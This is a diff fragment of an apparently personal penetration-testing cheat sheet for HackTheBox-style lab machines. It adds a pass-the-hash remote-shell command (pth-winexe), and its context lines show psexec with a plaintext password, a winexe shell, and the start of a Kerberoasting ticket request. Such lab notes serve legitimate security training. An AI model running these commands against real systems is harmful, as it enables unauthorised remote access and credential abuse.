@@ -3517,6 +3517,9 @@ psexec.py active.htb/Administrator:'Ticketmaster1968'@10.129.181.215
 # command  get shell by winexe run in linux
 winexe -U 'admin%password123' //10.49.154.207 cmd.exe
 
+# command  get shell by pth-winexe with hash run in linux
+pth-winexe -U 'admin%hash' //10.49.154.207 cmd.exe
+
 # command  Kerberoasting ( auth with kerberoas when NTLM dissable )  by targetedKerberoast.py
 impacket-getTGT voleur.htb/svc_ldap -dc-ip 10.10.11.7             ( Saving ticket in svc_ldap.ccache) 
 export KRB5CCNAME=svc_ldap.ccache
